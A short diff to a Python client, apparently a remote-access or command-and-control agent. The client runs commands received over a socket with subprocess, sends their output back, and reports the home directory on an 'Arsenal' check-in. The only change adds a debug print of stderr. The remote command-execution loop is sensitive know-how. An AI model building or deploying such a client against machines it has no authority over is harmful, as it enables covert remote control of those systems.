@@ -36,6 +36,7 @@ def main():
                 del command[0]
                 print(command)
                 output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                print(output.stderr)
                 sendit(s, output.stdout + output.stderr)
             elif 'Arsenal' in command:
                 sendit(s, 'Client initial checkin\nHomedir: %s\n' %os.environ.get('HOME'))
